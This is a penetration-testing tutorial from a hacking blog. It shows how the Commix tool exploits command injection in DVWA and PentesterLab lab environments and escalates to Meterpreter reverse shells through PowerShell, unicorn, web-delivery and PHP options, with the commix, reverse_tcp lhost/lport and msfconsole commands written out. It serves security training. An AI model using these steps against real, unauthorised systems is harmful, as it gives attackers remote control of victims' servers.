<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/kali-linux/" rel="category tag">Kali Linux</a>, <a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a>, <a href="https://www.hackingarticles.in/category/website-hacking/" rel="category tag">Website Hacking</a></span>            </div>
            <h1 class="post-title entry-title">Command Injection to Meterpreter using Commix</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/command-injection-meterpreter-using-commix/" rel="bookmark"><time class="entry-date published" datetime="2017-02-06T15:36:36+00:00">February 6, 2017</time><time class="updated" datetime="2025-05-27T12:42:55+00:00">May 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Commix is an automated command injection tool. It lets you have a meterpreter session via command injection if the web application is vulnerable to it. It’s pretty efficient and reliable. Commix is widely used by security experts, penetration testers and also web developers in </span>order<span style="color: #000000;"> to find vulnerabilities. In this </span>article<span style="color: #000000;">, we will learn how to get a meterpreter session using commix. For the detailed guide on commix click <a href="https://www.hackingarticles.in/commix-command-injection-exploiter-beginners-guide/">here</a>.</span></p>
<h3><span style="color: #800000;">Requirements :</span></h3>
<ul>
<li><span style="color: #000000;">DVWA (for Windows 10)</span></li>
<li><span style="color: #000000;">PentesterLab (for Linux testing)</span></li>
<li><span style="color: #000000;">Kali Linux</span></li>
<li><span style="color: #000000;">Commix</span></li>
</ul>
<h4><span style="color: #800000;">Gaining Initial Access with Commix via Command Injection</span></h4>
<p><span style="color: #000000;">As you can see in the image below the environment of DVWA is vulnerable to command injection. Submit the local host request from DVWA.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-TLsiNcwMUeM/XHP6FGZpwmI/AAAAAAAAc_4/NyWS7nTji4kfn3J9cJWMx4nkIfgElA8pACLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Capture the previously submitted request through BurpSuite by simultaneously turning on the intercept as shown in the image below :</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-F_y_aK36ejA/XHP6HlREVFI/AAAAAAAAdAU/NbJY1dfv68ASu0qVa-E--_vlkUp3-rDIACLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Once the cookies are capture, copy the whole cookie and paste it in a  TXT file. Now, use the following command in order to exploit the vulnerability of Command injection in the DVWA environment :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">commix -r /root/Desktop/req.txt</pre>
<p><span style="color: #000000;">here,</span></p>
<p><span style="color: #000000;">–</span>r:<span style="color: #000000;"> refers to the path of request file which will load HTTP.</span></p>
<p><span style="color: #000000;">As the exploitation is successful, it will ask you if you want to load the pseudo terminal or not. Type ‘y’ for the pseudo terminal and it will be loaded. Use the command ‘whoami’ to check the user as shown in the image :</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-iaPZODDt2-U/XHP6IKPc8GI/AAAAAAAAdAY/XiViWiyKdQ8gWkt3LT4Q0wJCv0m2h8b4QCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Now that </span>you<span style="color: #000000;"> are in the pseudo terminal, type the following set of command in order to generate reverse shell :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">reverse_tcp
set lhost 192.168.1.107
set lport 1234</pre>
<p><span style="color: #000000;">After executing </span>the above<span style="color: #000000;"> commands, it will ask you if you want to have a netcat shell or other (meterpreter) shell. So, press 2 for the meterpreter one. Then it will ask you which meterpreter session you want as in whether you want it to be PHP, Windows, etc. As our DWVA is setup on windows, we will select option 10. Then it will further ask you to choose a particular power shell injection. Choose 1 as of now as we will try other options too.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cT8-MXtTSzU/XHP6ImRnCuI/AAAAAAAAdAc/b-IWRVVbMTEiBxRytrECTfonnORKYGiWgCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">When everything is done, it will give a resource file with the execution command. Open a new terminal window and type the command there, as in our case it generated the following command :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfconsole -r /usr/share/commix/powershell_attack.rc</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RxH4VnsQUBA/XHP6JBNXHSI/AAAAAAAAdAg/QhFZ8sJm0EY7yqkeMWh9Np8-MS_z4TeswCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">When you execute the above command, you will directly have your meterpreter session as shown in the image above.</span></p>
<h4><span style="color: #800000;">Multiple Shell Techniques in Windows Using Commix</span></h4>
<p><span style="color: #000000;">Now, repeat the above steps as they are but instead of choosing 1 option of power shell injection </span>to choose<span style="color: #000000;"> 2 this time as it will help us get meterpreter session through magic unicorn. After choosing option 2, it will again generate a resource file for execution in the new terminal window. In our case </span>the following<span style="color: #000000;"> command was generated :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfconsole -r /usr/share/magic-unicorn/unicorn.rc</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FBOlU6s8aX8/XHP6JXBJx4I/AAAAAAAAdAk/F6fC_0UZzCkvoj9rqv1rqz_DbhcY-JqBACLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Again, when the command is executing you will have your meterpreter session as shown in the image below :</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-y4-4oRVsQmE/XHP6Jgr2_9I/AAAAAAAAdAo/nLnHpEVdt38wpzaLwGyIL7v1cigYqV5IACLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">All the above meterpreter session were taken using option 10 under the category of </span>the meterpreter<span style="color: #000000;"> reverse shell. But this time we will use option 11, which is web delivery, to have a meterpreter session. So, repeat the same steps as above but this time choose 11 option when asked for which meterpreter reverse shell you want.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hVGV-bMBjaY/XHP6KfWsUuI/AAAAAAAAdAs/YcEfjhmVs5ApJThdegPNPi5Rt4nv-OU1wCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Then once you have chosen option 11, it will ask whether you want web delivery script for PHP, Python or windows. Now, as we are attacking windows select option 3.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-76WLkGGXfvQ/XHP6KZmI5iI/AAAAAAAAdAw/rUURdrAP4aAEsf0efUHZEcfFUROTGGUlwCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Once again, it will give you a </span>resource<span style="color: #000000;"> file and a command that is to be run in the new terminal window. In our case, </span>the following<span style="color: #000000;"> command was generated :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfconsole -r /usr/share/commix/web_delivery.rc</pre>
<p><span style="color: #000000;"> As the command is executed, you will have your meterpreter session as shown in the image below :</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Fx1wIxUvEBQ/XHP6Ex4Re4I/AAAAAAAAc_w/yVVhayACA1skAkfggKOESo9lKtdMFD48gCLcBGAs/s1600/10.png"/></span></p>
<h4><span style="color: #800000;">Capture &amp; Inject</span></h4>
<p><span style="color: #000000;">Until now, all the meterpreter session we took were in the </span>Window’s<span style="color: #000000;"> environment. Now, will be gain meterpreter session in Linux’s environment. For this, we will use PentesterLab.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-DQmTsIEBaCE/XHP6FOFtAHI/AAAAAAAAc_0/SRk3vTxmR4YOgfAxJqoOv9im2u5jko6YwCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Just like we did for windows, capture the cookies of </span>pentesterlab<span style="color: #000000;"> in </span>burp suite<span style="color: #000000;"> as shown in the image below :</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WHOWbfNXYcQ/XHP6F8RGo2I/AAAAAAAAc_8/AnVEFWYHtAo-ieZVU20KiqgJBPC4voXxACLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Copy the contents of the cookies in a TXT file and use the following command to attack :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">commix -r /root/Desktop/1.txt</pre>
<p><span style="color: #000000;">As the exploitation is successful, it will ask you if you want to load the pseudo terminal or not. Type ‘y’ for the pseudo terminal and it will be loaded. Use the command ‘whoami’ to check the user as shown in the image :</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-88tvadHZRSU/XHP6GZz8UyI/AAAAAAAAdAE/XWST_KeGaNIimQDvh5vPUMi1KEKCwiKpgCLcBGAs/s1600/13.png"/></span></p>
<h4 data-start="255" data-end="286"><span style="color: #800000;">Reverse Shell Setup</span></h4>
<p><span style="color: #000000;">Now that you are in the pseudo terminal, type the following set of command in order to generate reverse shell :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">reverse_tcp
set lhost 192.168.1.107
set lport 1234</pre>
<p><span style="color: #000000;">After executing </span>the above<span style="color: #000000;"> commands, it will ask you if you want to have a netcat shell or other (meterpreter) shell. So, press 2 for the meterpreter one. Then it will ask you which meterpreter session you want as in whether you want it to be PHP, Windows, etc. As we are now testing on </span>Linux<span style="color: #000000;">, we will select option 8 i.e. a PHP meterpreter reverse shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-KdN9KUi0FZI/XHP6GDDUGjI/AAAAAAAAdAA/sPfMzkSWfD4vWHWl1yW-VhkrFRbOvmCXACLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Just like before, this too will generate a resource file which you have to execute in a new terminal window. In our case, the command generated was :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfconsole -r /usr/share/commix/php_meterpreter.rc</pre>
<p><span style="color: #000000;"> As the above command is executed, you will have </span>your<span style="color: #000000;"> session as shown in the image below :</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-8-rwAhCxWG8/XHP6Gh5xd9I/AAAAAAAAdAI/KlOINE6NtLUD3cYdrvToJEXOmj20fQQawCLcBGAs/s1600/15.png"/></span></p>
<h4><span style="color: #800000;">Web Delivery Method</span></h4>
<p><span style="color: #000000;">The other method we will use to exploit </span>Linux<span style="color: #000000;"> is by using web delivery. Repeat the above steps similarly, </span>but<span style="color: #000000;"> instead of choosing option 8, this time choose option 11 for web delivery. And then choose option 2 for a PHP reverse shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-xP9xTfnMc0s/XHP6HPM0rVI/AAAAAAAAdAQ/Ui4DvBJhSV8Y-wDu9QhiQjAz0pdCPgI3gCLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Executing the above steps will create a resource file yet again. Run the command given in the new terminal window :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfconsole -r /usr/share/commix/web_delivery.rc</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4gTmyEdUMho/XHP6HN9W2PI/AAAAAAAAdAM/CKMietIw0B8zYsN0CoIM_CG9g_86EoiHQCLcBGAs/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Running the above command will give </span>you your<span style="color: #000000;"> session as shown in the above image. This is </span>how<span style="color: #000000;"> you can gain a meterpreter session through command injection vulnerability using commix. The session can be acquired in both Windows and </span>Linux<span style="color: #000000;"> platforms.</span></p>
<p><span style="color: #000000;">To learn more about Website Hacking. Follow this</span> <a href="https://www.hackingarticles.in/category/website-hacking/"><strong>Link.</strong></a></p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <span style="color: #0000ff;"><strong><a class="broken_link" style="color: #0000ff;" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
